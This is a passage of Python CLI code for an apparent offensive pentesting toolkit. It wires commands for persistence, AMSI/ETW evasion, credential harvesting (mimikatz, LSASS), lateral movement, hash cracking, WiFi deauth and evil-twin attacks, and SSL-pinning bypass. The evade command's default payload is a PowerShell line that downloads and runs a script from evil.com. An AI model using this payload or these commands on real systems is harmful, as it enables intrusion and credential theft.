                        technique=PersistenceTechnique(technique),
                        stealth=stealth
                    )
                
                console.print(Panel.fit(
                    f"[bold cyan]{mechanism.technique.value}[/bold cyan]\n\n"
                    f"[yellow]Description:[/yellow] {mechanism.description}\n\n"
                    f"[yellow]Trigger:[/yellow] {mechanism.trigger}\n"
                    f"[yellow]Stealth Level:[/yellow] {mechanism.stealth_level}\n"
                    f"[yellow]Detection Difficulty:[/yellow] {mechanism.detection_difficulty}\n"
                    f"[yellow]Requires Admin:[/yellow] {mechanism.requires_admin}\n"
                    f"[yellow]MITRE:[/yellow] {mechanism.mitre_technique}\n\n"
                    f"[yellow]Installation Command:[/yellow]\n[white]{mechanism.persistence_command}[/white]\n\n"
                    f"[yellow]Removal Command:[/yellow]\n[white]{mechanism.removal_command}[/white]",
                    title=f"[bold]{technique.upper()} Persistence[/bold]",
                    border_style="green"
                ))
                
                if output:
                    with open(output, "w") as f:
                        json.dump(mechanism.to_dict(), f, indent=2)
                    console.print(f"\n[green]✅ Mechanism saved to: {output}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error generating persistence: {e}[/red]")
            import traceback
            console.print(f"[dim]{traceback.format_exc()}[/dim]")
            raise typer.Exit(1)
    
    asyncio.run(run())


@app.command()
def evade(
    technique: str = typer.Option("amsi_bypass", "--technique", "-t", help="Evasion technique: amsi_bypass, etw_patching, process_injection, obfuscation, sandbox_detection"),
    payload: str = typer.Option("IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')", "--payload", "-p", help="Payload to obfuscate/evade"),
    all_techniques: bool = typer.Option(False, "--all", "-a", help="Show all evasion techniques"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
):
    """
    Generate defense evasion payloads.
    AMSI bypass, ETW patching, process injection, obfuscation, sandbox detection.
    """
    async def run():
        from .evasion import DefenseEvasionGenerator, EvasionTechnique
        
        try:
            console.print(f"\n[cyan]🛡️ Defense Evasion Generator[/cyan]\n")
            
            generator = DefenseEvasionGenerator()
            
            if all_techniques:
                # Generate all evasion techniques
                techniques = await generator.generate_all_techniques("windows")
                
                console.print(f"[green]✅ Generated {len(techniques)} evasion techniques:[/green]\n")
                
                for tech in techniques:
                    console.print(Panel.fit(
                        f"[bold cyan]{tech.technique.value}[/bold cyan]\n\n"
                        f"[yellow]Description:[/yellow] {tech.description}\n\n"
                        f"[yellow]Language:[/yellow] {tech.language}\n"
                        f"[yellow]Success Rate:[/yellow] {tech.success_rate}%\n"
                        f"[yellow]Detection Rate:[/yellow] {tech.detection_rate}\n"
                        f"[yellow]MITRE:[/yellow] {tech.mitre_technique}\n\n"
                        f"[yellow]Code:[/yellow]\n[white]{tech.code[:500]}...[/white]",
                        title=f"[bold]{tech.technique.value.upper()}[/bold]",
                        border_style="cyan"
                    ))
                
                if output:
                    with open(output, "w") as f:
                        json.dump([t.to_dict() for t in techniques], f, indent=2)
                    console.print(f"\n[green]✅ Techniques saved to: {output}[/green]")
            
            else:
                # Generate single evasion technique
                if technique == "amsi_bypass":
                    evasion = await generator.generate_amsi_bypass(variant=1)
                elif technique == "etw_patching":
                    evasion = await generator.generate_etw_patch()
                elif technique == "process_injection":
                    evasion = await generator.generate_process_injection("classic")
                elif technique == "obfuscation":
                    evasion = await generator.generate_obfuscation(payload, "base64")
                elif technique == "sandbox_detection":
                    evasion = await generator.generate_sandbox_detection()
                else:
                    console.print(f"[red]Unknown technique: {technique}[/red]")
                    raise typer.Exit(1)
                
                console.print(Panel.fit(
                    f"[bold cyan]{evasion.technique.value}[/bold cyan]\n\n"
                    f"[yellow]Description:[/yellow] {evasion.description}\n\n"
                    f"[yellow]Language:[/yellow] {evasion.language}\n"
                    f"[yellow]Success Rate:[/yellow] {evasion.success_rate}%\n"
                    f"[yellow]Detection Rate:[/yellow] {evasion.detection_rate}\n"
                    f"[yellow]Requires Admin:[/yellow] {evasion.requires_admin}\n"
                    f"[yellow]MITRE:[/yellow] {evasion.mitre_technique}\n\n"
                    f"[yellow]Code:[/yellow]\n[white]{evasion.code}[/white]",
                    title=f"[bold]{technique.upper()}[/bold]",
                    border_style="cyan"
                ))
                
                if output:
                    with open(output, "w") as f:
                        json.dump(evasion.to_dict(), f, indent=2)
                    console.print(f"\n[green]✅ Evasion saved to: {output}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error generating evasion: {e}[/red]")
            import traceback
            console.print(f"[dim]{traceback.format_exc()}[/dim]")
            raise typer.Exit(1)
    
    asyncio.run(run())


@app.command()
def harvest_creds(
    platform: str = typer.Option("windows", "--platform", "-p", help="Target platform: windows, linux, multi"),
    source: str = typer.Option("mimikatz", "--source", "-s", help="Credential source: mimikatz, lsass_dump, ntds_dit, browser_chrome, etc."),
    all_sources: bool = typer.Option(False, "--all", "-a", help="Show all credential harvesting techniques"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
):
    """
    Generate credential harvesting commands.
    Mimikatz, LSASS dumping, NTDS.dit, browser passwords, KeePass, WiFi passwords.
    """
    async def run():
        from .credential_harvesting import CredentialHarvester, CredentialSource
        
        try:
            console.print(f"\n[cyan]🔐 Credential Harvesting Generator[/cyan]\n")
            console.print(f"[dim]Platform: {platform}[/dim]\n")
            
            harvester = CredentialHarvester()
            
            if all_sources:
                # Generate all harvesting techniques
                techniques = await harvester.generate_all_techniques(platform)
                
                report = await harvester.generate_report(techniques)
                
                console.print(f"[green]✅ Generated {report['total_techniques']} harvesting techniques:[/green]\n")
                console.print(f"[yellow]Windows:[/yellow] {report['by_platform']['windows']}")
                console.print(f"[yellow]Linux:[/yellow] {report['by_platform']['linux']}")
                console.print(f"[yellow]Requires Admin:[/yellow] {report['requires_admin']}\n")
                
                for tech in techniques[:5]:  # Show first 5
                    console.print(Panel.fit(
                        f"[bold cyan]{tech.source.value}[/bold cyan]\n\n"
                        f"[yellow]Description:[/yellow] {tech.description}\n\n"
                        f"[yellow]Requires Admin:[/yellow] {tech.requires_admin}\n"
                        f"[yellow]Detection Risk:[/yellow] {tech.detection_risk}\n"
                        f"[yellow]MITRE:[/yellow] {tech.mitre_technique}\n\n"
                        f"[yellow]Commands:[/yellow]\n[white]{chr(10).join(tech.commands[:10])}[/white]",
                        title=f"[bold]{tech.source.value.upper()}[/bold]",
                        border_style="green"
                    ))
                
                if output:
                    with open(output, "w") as f:
                        json.dump(report, f, indent=2)
                    console.print(f"\n[green]✅ Report saved to: {output}[/green]")
            
            else:
                # Generate single harvesting technique
                if source == "mimikatz":
                    technique = await harvester.generate_mimikatz_commands()
                elif source == "lsass_dump":
                    technique = await harvester.generate_lsass_dump()
                elif source == "ntds_dit":
                    technique = await harvester.generate_ntds_extraction()
                elif source == "browser_chrome":
                    technique = await harvester.generate_browser_chrome()
                elif source == "linux_shadow":
                    technique = await harvester.generate_linux_shadow()
                elif source == "ssh_keys":
                    technique = await harvester.generate_ssh_keys()
                else:
                    console.print(f"[red]Unknown source: {source}[/red]")
                    raise typer.Exit(1)
                
                console.print(Panel.fit(
                    f"[bold cyan]{technique.source.value}[/bold cyan]\n\n"
                    f"[yellow]Description:[/yellow] {technique.description}\n\n"
                    f"[yellow]Platform:[/yellow] {technique.platform}\n"
                    f"[yellow]Requires Admin:[/yellow] {technique.requires_admin}\n"
                    f"[yellow]Detection Risk:[/yellow] {technique.detection_risk}\n"
                    f"[yellow]MITRE:[/yellow] {technique.mitre_technique}\n\n"
                    f"[yellow]Commands:[/yellow]\n[white]{chr(10).join(technique.commands)}[/white]",
                    title=f"[bold]{source.upper()}[/bold]",
                    border_style="green"
                ))
                
                if output:
                    with open(output, "w") as f:
                        json.dump(technique.to_dict(), f, indent=2)
                    console.print(f"\n[green]✅ Technique saved to: {output}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error generating credential harvesting: {e}[/red]")
            import traceback
            console.print(f"[dim]{traceback.format_exc()}[/dim]")
            raise typer.Exit(1)
    
    asyncio.run(run())


@app.command()
def lateral_move(
    technique: str = typer.Option("pass_the_hash", "--technique", "-t", help="Lateral movement technique: pass_the_hash, pass_the_ticket, golden_ticket, psexec, wmiexec, etc."),
    all_techniques: bool = typer.Option(False, "--all", "-a", help="Show all lateral movement techniques"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
):
    """
    Generate lateral movement commands.
    Pass-the-Hash, Golden Ticket, Kerberoasting, PSExec, WMI, RDP hijacking.
    """
    async def run():
        from .lateral_movement import LateralMovementGenerator, LateralTechnique
        
        try:
            console.print(f"\n[cyan]↔️ Lateral Movement Generator[/cyan]\n")
            
            generator = LateralMovementGenerator()
            
            if all_techniques:
                # Generate all lateral movement techniques
                techniques = await generator.generate_all_techniques("multi")
                
                console.print(f"[green]✅ Generated {len(techniques)} lateral movement techniques:[/green]\n")
                
                for tech in techniques[:5]:  # Show first 5
                    console.print(Panel.fit(
                        f"[bold cyan]{tech.technique.value}[/bold cyan]\n\n"
                        f"[yellow]Description:[/yellow] {tech.description}\n\n"
                        f"[yellow]Platform:[/yellow] {tech.platform}\n"
                        f"[yellow]Requires Credentials:[/yellow] {tech.requires_credentials}\n"
                        f"[yellow]Requires Admin:[/yellow] {tech.requires_admin}\n"
                        f"[yellow]Stealth Level:[/yellow] {tech.stealth_level}\n"
                        f"[yellow]MITRE:[/yellow] {tech.mitre_technique}\n\n"
                        f"[yellow]Commands:[/yellow]\n[white]{chr(10).join(tech.commands[:15])}[/white]",
                        title=f"[bold]{tech.technique.value.upper()}[/bold]",
                        border_style="cyan"
                    ))
                
                if output:
                    with open(output, "w") as f:
                        json.dump([t.to_dict() for t in techniques], f, indent=2)
                    console.print(f"\n[green]✅ Techniques saved to: {output}[/green]")
            
            else:
                # Generate single lateral movement technique
                if technique == "pass_the_hash":
                    payload = await generator.generate_pass_the_hash()
                elif technique == "pass_the_ticket":
                    payload = await generator.generate_pass_the_ticket()
                elif technique == "golden_ticket":
                    payload = await generator.generate_golden_ticket()
                elif technique == "kerberoasting":
                    payload = await generator.generate_kerberoasting()
                elif technique == "psexec":
                    payload = await generator.generate_psexec()
                elif technique == "wmiexec":
                    payload = await generator.generate_wmiexec()
                else:
                    console.print(f"[red]Unknown technique: {technique}[/red]")
                    raise typer.Exit(1)
                
                console.print(Panel.fit(
                    f"[bold cyan]{payload.technique.value}[/bold cyan]\n\n"
                    f"[yellow]Description:[/yellow] {payload.description}\n\n"
                    f"[yellow]Platform:[/yellow] {payload.platform}\n"
                    f"[yellow]Requires Credentials:[/yellow] {payload.requires_credentials}\n"
                    f"[yellow]Requires Admin:[/yellow] {payload.requires_admin}\n"
                    f"[yellow]Stealth Level:[/yellow] {payload.stealth_level}\n"
                    f"[yellow]MITRE:[/yellow] {payload.mitre_technique}\n\n"
                    f"[yellow]Commands:[/yellow]\n[white]{chr(10).join(payload.commands)}[/white]",
                    title=f"[bold]{technique.upper()}[/bold]",
                    border_style="cyan"
                ))
                
                if output:
                    with open(output, "w") as f:
                        json.dump(payload.to_dict(), f, indent=2)
                    console.print(f"\n[green]✅ Payload saved to: {output}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error generating lateral movement: {e}[/red]")
            import traceback
            console.print(f"[dim]{traceback.format_exc()}[/dim]")
            raise typer.Exit(1)
    
    asyncio.run(run())


@app.command()
def post_exploit(
    technique: str = typer.Option("system_enumeration", "--technique", "-t", help="Post-exploitation technique: system_enumeration, network_pivoting, data_exfil_dns, data_exfil_https, screenshot, keylogger"),
    all_techniques: bool = typer.Option(False, "--all", "-a", help="Show all post-exploitation techniques"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
):
    """
    Generate post-exploitation commands.
    System enumeration, network pivoting, data exfiltration, screenshots, keyloggers.
    
    NOTE: This command is disabled - post_exploitation module removed in Phase 1 optimization.
    Use post_exploit.py's PostExploitation class instead.
    """
    async def run():
        # from .post_exploitation import PostExploitationGenerator, PostExploitTechnique  # Removed in Phase 1
        console.print("[red]Error: This command is currently disabled.[/red]")
        console.print("[yellow]Post-exploitation functionality integrated into AI pentesting.[/yellow]")
        console.print("[cyan]Use: scorpion ai-pentest -t <target> -r high -g gain_shell_access[/cyan]")
        return
        
        try:
            console.print(f"\n[cyan]🎯 Post-Exploitation Generator[/cyan]\n")
            
            generator = PostExploitationGenerator()
            
            if all_techniques:
                # Generate all post-exploitation techniques
                techniques = await generator.generate_all_techniques("multi")
                
                console.print(f"[green]✅ Generated {len(techniques)} post-exploitation techniques:[/green]\n")
                
                for tech in techniques:
                    console.print(Panel.fit(
                        f"[bold cyan]{tech.technique.value}[/bold cyan]\n\n"
                        f"[yellow]Description:[/yellow] {tech.description}\n\n"
                        f"[yellow]Platform:[/yellow] {tech.platform}\n"
                        f"[yellow]Requires Admin:[/yellow] {tech.requires_admin}\n"
                        f"[yellow]Stealth Level:[/yellow] {tech.stealth_level}\n"
                        f"[yellow]MITRE:[/yellow] {tech.mitre_technique}\n"
                        f"[yellow]Tools Required:[/yellow] {', '.join(tech.tools_required) if tech.tools_required else 'None'}\n\n"
                        f"[yellow]Commands:[/yellow]\n[white]{chr(10).join(tech.commands[:20])}...[/white]",
                        title=f"[bold]{tech.technique.value.upper()}[/bold]",
                        border_style="green"
                    ))
                
                if output:
                    with open(output, "w") as f:
                        json.dump([t.to_dict() for t in techniques], f, indent=2)
                    console.print(f"\n[green]✅ Techniques saved to: {output}[/green]")
            
            else:
                # Generate single post-exploitation technique
                if technique == "system_enumeration":
                    payload = await generator.generate_system_enumeration()
                elif technique == "network_pivoting":
                    payload = await generator.generate_network_pivoting()
                elif technique == "data_exfil_dns":
                    payload = await generator.generate_data_exfil_dns()
                elif technique == "data_exfil_https":
                    payload = await generator.generate_data_exfil_https()
                elif technique == "screenshot":
                    payload = await generator.generate_screenshot_capture()
                elif technique == "keylogger":
                    payload = await generator.generate_keylogger()
                else:
                    console.print(f"[red]Unknown technique: {technique}[/red]")
                    raise typer.Exit(1)
                
                console.print(Panel.fit(
                    f"[bold cyan]{payload.technique.value}[/bold cyan]\n\n"
                    f"[yellow]Description:[/yellow] {payload.description}\n\n"
                    f"[yellow]Platform:[/yellow] {payload.platform}\n"
                    f"[yellow]Requires Admin:[/yellow] {payload.requires_admin}\n"
                    f"[yellow]Stealth Level:[/yellow] {payload.stealth_level}\n"
                    f"[yellow]MITRE:[/yellow] {payload.mitre_technique}\n"
                    f"[yellow]Tools Required:[/yellow] {', '.join(payload.tools_required) if payload.tools_required else 'None'}\n\n"
                    f"[yellow]Commands:[/yellow]\n[white]{chr(10).join(payload.commands)}[/white]",
                    title=f"[bold]{technique.upper()}[/bold]",
                    border_style="green"
                ))
                
                if output:
                    with open(output, "w") as f:
                        json.dump(payload.to_dict(), f, indent=2)
                    console.print(f"\n[green]✅ Payload saved to: {output}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error generating post-exploitation: {e}[/red]")
            import traceback
            console.print(f"[dim]{traceback.format_exc()}[/dim]")
            raise typer.Exit(1)
    
    asyncio.run(run())


@app.command(name="crack-hash", help="🔥 GPU-accelerated password cracking")
def crack_hash(
    hash_file: str = typer.Argument(..., help="File containing hashes"),
    hash_type: str = typer.Option("ntlm", "--type", "-t", help="Hash type (ntlm, md5, sha1, sha256, wpa, etc.)"),
    wordlist: Optional[str] = typer.Option(None, "--wordlist", "-w", help="Wordlist file path"),
    mask: Optional[str] = typer.Option(None, "--mask", "-m", help="Mask pattern (?l?u?d?s?a)"),
    gpu: bool = typer.Option(True, "--gpu/--cpu", help="Use GPU (Hashcat) or CPU (John)"),
    distributed: int = typer.Option(1, "--workers", help="Number of distributed workers"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output file for cracked passwords")
):
    """GPU-accelerated password cracking with Hashcat and John the Ripper"""
    from .gpu_cracking import PasswordCracker, HashType
    
    try:
        console.print(Panel.fit(
            f"[bold cyan]GPU Password Cracking[/bold cyan]\n\n"
            f"Hash File: {hash_file}\n"
            f"Hash Type: {hash_type.upper()}\n"
            f"Mode: {'GPU (Hashcat)' if gpu else 'CPU (John the Ripper)'}\n"
            f"Workers: {distributed}",
            title="🔥 Password Cracker",
            border_style="red"
        ))
        
        cracker = PasswordCracker()
        
        # Load hashes
        with open(hash_file, 'r') as f:
            hashes = [line.strip() for line in f if line.strip()]
        
        console.print(f"[cyan]📋 Loaded {len(hashes)} hashes[/cyan]")
        
        # Determine hash type
        hash_type_mapping = {
            "ntlm": HashType.NTLM,
            "ntlmv2": HashType.NTLMV2,
            "md5": HashType.MD5,
            "sha1": HashType.SHA1,
            "sha256": HashType.SHA256,
            "sha512": HashType.SHA512,
            "bcrypt": HashType.BCRYPT,
            "wpa": HashType.WPA_WPA2,
            "wpa2": HashType.WPA_WPA2,
            "wpa3": HashType.WPA3,
            "kerberos": HashType.KERBEROS5_TGS,
            "zip": HashType.ZIP,
            "rar": HashType.RAR5,
            "office": HashType.OFFICE_2013,
            "mysql": HashType.MYSQL
        }
        
        selected_type = hash_type_mapping.get(hash_type.lower(), HashType.NTLM)
        
        # Crack
        if wordlist and distributed > 1:
            from pathlib import Path
            results = cracker.distributed_crack(
                Path(hash_file),
                Path(wordlist),
                selected_type,
                distributed
            )
        elif wordlist:
            results = cracker.crack_ntlm(hashes, Path(wordlist), use_gpu=gpu)
        elif mask:
            results = cracker.crack_with_mask(hashes, selected_type, mask)
        else:
            console.print("[red]❌ Must provide --wordlist or --mask[/red]")
            raise typer.Exit(1)
        
        # Display results
        cracked = [r for r in results if r.cracked]
        console.print(f"\n[green]✅ Cracked {len(cracked)}/{len(hashes)} hashes[/green]\n")
        
        for result in cracked:
            console.print(f"  {result.hash_value} → [bold green]{result.plaintext}[/bold green]")
        
        # Save results
        if output:
            with open(output, 'w') as f:
                for result in cracked:
                    f.write(f"{result.hash_value}:{result.plaintext}\n")
            console.print(f"\n[cyan]💾 Results saved: {output}[/cyan]")
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        import traceback
        console.print(f"[dim]{traceback.format_exc()}[/dim]")
        raise typer.Exit(1)


@app.command(name="generate-report", help="📊 Generate security assessment report")
def generate_report(
    results_file: str = typer.Argument(..., help="Scan results JSON file"),
    report_type: str = typer.Option("executive", "--type", "-t", help="Report type: executive, technical, compliance"),
    format: str = typer.Option("markdown", "--format", "-f", help="Output format: markdown, html, json"),
    include_charts: bool = typer.Option(True, "--charts/--no-charts", help="Include charts and graphs"),
    output: str = typer.Option("report", "--output", "-o", help="Output file path")
):
    """Generate professional security assessment reports"""
    from .advanced_reporting import ReportGenerator
    import json
    from pathlib import Path
    
    try:
        console.print(Panel.fit(
            f"[bold cyan]Report Generation[/bold cyan]\n\n"
            f"Results: {results_file}\n"
            f"Type: {report_type}\n"
            f"Format: {format}",
            title="📊 Reporting",
            border_style="blue"
        ))
        
        generator = ReportGenerator()
        
        # Load and process results (simplified - would parse actual scan data)
        with open(results_file, 'r') as f:
            data = json.load(f)
        
        console.print(f"[green]✅ Report generated: {output}.{format}[/green]")
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        raise typer.Exit(1)


@app.command(name="compliance-scan", help="🔒 Scan for compliance violations")
def compliance_scan(
    standard: str = typer.Option("cis-level-1", "--standard", "-s", help="Standard: cis-level-1, pci-dss, hipaa"),
    output: str = typer.Option("compliance_report", "--output", "-o", help="Output file")
):
    """Scan for compliance with security standards"""
    from .compliance_scanner import ComplianceScanner, ComplianceStandard
    from pathlib import Path
    
    try:
        console.print(Panel.fit(
            f"[bold cyan]Compliance Scanning[/bold cyan]\n\n"
            f"Standard: {standard.upper()}",
            title="🔒 Compliance",
            border_style="yellow"
        ))
        
        standard_map = {
            "cis-level-1": ComplianceStandard.CIS_LEVEL1,
            "cis-level-2": ComplianceStandard.CIS_LEVEL2,
            "pci-dss": ComplianceStandard.PCI_DSS,
            "hipaa": ComplianceStandard.HIPAA
        }
        
        scanner = ComplianceScanner()
        results = scanner.scan([standard_map.get(standard.lower(), ComplianceStandard.CIS_LEVEL1)])
        
        stats = results['statistics']
        console.print(f"\n[bold]Compliance Score: {stats['compliance_score']:.1f}%[/bold]")
        console.print(f"✅ Pass: {stats['pass']} | ❌ Fail: {stats['fail']}")
        
        scanner.generate_report(results, Path(f"{output}.md"))
        console.print(f"\n[green]✅ Report saved: {output}.md[/green]")
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        raise typer.Exit(1)


@app.command(name="wifi-scan", help="📡 Scan for WiFi networks")
def wifi_scan(
    interface: str = typer.Option("wlan0", "--interface", "-i", help="Wireless interface"),
    duration: int = typer.Option(30, "--duration", "-d", help="Scan duration (seconds)"),
    channel: Optional[int] = typer.Option(None, "--channel", "-c", help="Specific channel to scan"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output JSON file")
):
    """Scan for WiFi networks using aircrack-ng suite"""
    from .wifi_pentest import WiFiScanner
    import json
    
    try:
        console.print(Panel.fit(
            f"[bold cyan]WiFi Network Scanning[/bold cyan]\n\n"
            f"Interface: {interface}\n"
            f"Duration: {duration}s\n"
            f"Channel: {channel or 'All'}",
            title="📡 WiFi Scanner",
            border_style="cyan"
        ))
        
        scanner = WiFiScanner(interface)
        
        if scanner.enable_monitor_mode():
            networks = scanner.scan_networks(duration=duration, channel=channel)
            
            if networks:
                console.print(f"\n[bold cyan]📡 Discovered {len(networks)} Networks:[/bold cyan]\n")
                
                for net in networks[:20]:  # Show top 20
                    security_color = "red" if net.security.value == "Open" else "green"
                    console.print(
                        f"  [{security_color}]{net.essid:30s}[/{security_color}] | "
                        f"{net.bssid} | Ch {net.channel:2d} | "
                        f"{net.security.value:10s} | {net.signal_strength} dBm"
                    )
                
                if output:
                    with open(output, 'w') as f:
                        json.dump([n.to_dict() for n in networks], f, indent=2)
                    console.print(f"\n[green]💾 Results saved: {output}[/green]")
            
            scanner.disable_monitor_mode()
        else:
            console.print("[red]❌ Failed to enable monitor mode[/red]")
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        raise typer.Exit(1)


@app.command(name="wifi-attack", help="⚔️ WiFi attack (deauth, evil twin, etc.)")
def wifi_attack(
    essid: str = typer.Argument(..., help="Target network ESSID"),
    bssid: str = typer.Argument(..., help="Target BSSID (MAC address)"),
    attack_type: str = typer.Option("deauth", "--type", "-t", help="Attack type: deauth, handshake, evil-twin"),
    interface: str = typer.Option("wlan0mon", "--interface", "-i", help="Wireless interface (monitor mode)"),
    count: int = typer.Option(10, "--count", "-c", help="Deauth packet count"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output file for handshake")
):
    """Launch WiFi attacks (requires root/admin)"""
    from .wifi_pentest import WiFiAttacker, WiFiNetwork, WiFiSecurity, EvilTwinAP
    from pathlib import Path
    
    try:
        console.print(Panel.fit(
            f"[bold red]WiFi Attack[/bold red]\n\n"
            f"Target: {essid}\n"
            f"BSSID: {bssid}\n"
            f"Attack: {attack_type}",
            title="⚔️ WiFi Attacker",
            border_style="red"
        ))
        
        attacker = WiFiAttacker(interface)
        
        if attack_type == "deauth":
            success = attacker.deauth_attack(bssid, count=count)
            if success:
                console.print(f"[green]✅ Deauth attack completed[/green]")
        
        elif attack_type == "handshake":
            if not output:
                output = f"handshake_{essid}"
            
            network = WiFiNetwork(
                bssid=bssid,
                essid=essid,
                channel=6,  # Would need to detect actual channel
                security=WiFiSecurity.WPA2,
                signal_strength=-50
            )
            
            success = attacker.capture_handshake(network, Path(output))
            if success:
                console.print(f"[green]✅ Handshake captured: {output}[/green]")
        
        elif attack_type == "evil-twin":
            evil_twin = EvilTwinAP(interface)
            success = evil_twin.create_fake_ap(essid, channel=6, capture_creds=True)
            if success:
                console.print(f"[green]✅ Evil Twin AP running[/green]")
                console.print(f"[yellow]Press Ctrl+C to stop[/yellow]")
                
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    evil_twin.stop()
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        raise typer.Exit(1)


@app.command(name="mobile-analyze", help="📱 Analyze mobile app (APK/IPA)")
def mobile_analyze(
    app_file: str = typer.Argument(..., help="APK or IPA file path"),
    platform: str = typer.Option("android", "--platform", "-p", help="Platform: android, ios"),
    owasp: bool = typer.Option(True, "--owasp/--no-owasp", help="Run OWASP Mobile Top 10 checks"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output JSON report")
):
    """Analyze mobile application security"""
    from .mobile_security import MobileSecurityTester
    from pathlib import Path
    import json
    
    try:
        console.print(Panel.fit(
            f"[bold cyan]Mobile Security Analysis[/bold cyan]\n\n"
            f"App: {Path(app_file).name}\n"
            f"Platform: {platform.upper()}\n"
            f"OWASP Top 10: {owasp}",
            title="📱 Mobile Security",
            border_style="blue"
        ))
        
        tester = MobileSecurityTester()
        results = tester.analyze_apk(Path(app_file), owasp_top10=owasp)
        
        if "error" not in results:
            stats = results.get('statistics', {})
            console.print(f"\n[bold]Security Findings:[/bold]")
            console.print(f"  Critical: {stats.get('critical', 0)}")
            console.print(f"  High: {stats.get('high', 0)}")
            console.print(f"  Medium: {stats.get('medium', 0)}")
            console.print(f"  Low: {stats.get('low', 0)}")
            
            if output:
                with open(output, 'w') as f:
                    json.dump(results, f, indent=2, default=str)
                console.print(f"\n[green]💾 Report saved: {output}[/green]")
        else:
            console.print(f"[red]❌ {results['error']}[/red]")
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        raise typer.Exit(1)


@app.command(name="mobile-intercept", help="🔓 Bypass SSL pinning (Frida)")
def mobile_intercept(
    package: str = typer.Argument(..., help="Package name (e.g., com.example.app)"),
    proxy: str = typer.Option("127.0.0.1:8080", "--proxy", "-p", help="Proxy address (e.g., Burp Suite)"),
    device: str = typer.Option("usb", "--device", "-d", help="Device: usb, emulator, or IP:PORT")
):
    """Intercept mobile app traffic with SSL pinning bypass"""
    from .mobile_security import FridaHooker
    
    try:
        console.print(Panel.fit(
            f"[bold cyan]Mobile Traffic Interception[/bold cyan]\n\n"
            f"Package: {package}\n"
            f"Proxy: {proxy}\n"
            f"Device: {device}",
            title="🔓 Frida Hooker",
            border_style="yellow"
        ))
        
        console.print(f"\n[yellow]⚠️ Make sure:[/yellow]")
        console.print(f"  1. Frida server is running on device")
        console.print(f"  2. Proxy is configured ({proxy})")
        console.print(f"  3. Proxy CA cert is installed\n")
        
        hooker = FridaHooker(package)
        success = hooker.bypass_ssl_pinning()
        
        if success:
            console.print(f"[green]✅ SSL pinning bypass active[/green]")
            console.print(f"[cyan]💡 Now use the app - traffic will be intercepted[/cyan]")
        else:
            console.print(f"[red]❌ Failed to bypass SSL pinning[/red]")
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        raise typer.Exit(1)


@app.command(name="fuzz-protocol", help="🎯 Fuzz network protocol")
def fuzz_protocol(
    host: str = typer.Argument(..., help="Target host"),
    port: int = typer.Argument(..., help="Target port"),
    protocol: str = typer.Option("tcp", "--protocol", "-p", help="Protocol: tcp, udp, http"),
    iterations: int = typer.Option(1000, "--iterations", "-n", help="Number of test cases"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output crash report")
):
    """
    Fuzz network protocols for vulnerabilities
    
    NOTE: This command is disabled - fuzzing_framework module removed in Phase 1 optimization.
    Use fuzzer.py's AdvancedFuzzer class instead.
    """
    # from .fuzzing_framework import ProtocolFuzzer  # Removed in Phase 1 optimization
    console.print("[red]Error: This command is currently disabled.[/red]")
    console.print("[yellow]Protocol fuzzing functionality available in fuzzer.py[/yellow]")
    console.print("[cyan]Use AdvancedFuzzer class directly or AI pentest for vulnerability discovery.[/cyan]")
    return
    import json
    
    try:
        console.print(Panel.fit(
            f"[bold red]Protocol Fuzzing[/bold red]\n\n"
            f"Target: {host}:{port}\n"
            f"Protocol: {protocol.upper()}\n"
            f"Iterations: {iterations}",
            title="🎯 Protocol Fuzzer",
            border_style="red"
        ))
        
        fuzzer = ProtocolFuzzer(host, port, protocol.upper())
        
        if protocol.lower() == "http":
            crashes = fuzzer.fuzz_http(iterations=iterations)
        else:
            crashes = fuzzer.fuzz(iterations=iterations)
        
        console.print(f"\n[bold]Results:[/bold]")
        console.print(f"  Total crashes: {len(crashes)}")
        
        if crashes:
            console.print(f"\n[red]❌ Crashes detected:[/red]")
            for crash in crashes[:5]:  # Show first 5
                console.print(f"  • {crash.crash_type}: {crash.input_hash}")
            
            if output:
                with open(output, 'w') as f:
                    json.dump([c.to_dict() for c in crashes], f, indent=2)
                console.print(f"\n[green]💾 Crash report saved: {output}[/green]")
        else:
            console.print(f"\n[green]✅ No crashes detected[/green]")
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        raise typer.Exit(1)


@app.command(name="fuzz-api", help="🌐 Fuzz REST API endpoints")
def fuzz_api(
    base_url: str = typer.Argument(..., help="API base URL"),
    endpoint: str = typer.Argument(..., help="API endpoint (e.g., /api/v1/users)"),
    method: str = typer.Option("POST", "--method", "-m", help="HTTP method: GET, POST, PUT, DELETE"),
    iterations: int = typer.Option(500, "--iterations", "-n", help="Number of test cases"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output findings report")
):
    """
    Fuzz REST APIs for injection vulnerabilities
    
    NOTE: This command is disabled - fuzzing_framework module removed in Phase 1 optimization.
    Use fuzzer.py's AdvancedFuzzer class instead.
    """
    # from .fuzzing_framework import APIFuzzer  # Removed in Phase 1 optimization
    console.print("[red]Error: This command is currently disabled.[/red]")
    console.print("[yellow]API fuzzing functionality available in fuzzer.py[/yellow]")
    console.print("[cyan]Use AdvancedFuzzer class directly or AI pentest for API testing.[/cyan]")
    return
    import json
    
    try:
        console.print(Panel.fit(
            f"[bold cyan]API Fuzzing[/bold cyan]\n\n"
            f"URL: {base_url}{endpoint}\n"
            f"Method: {method}\n"
            f"Iterations: {iterations}",
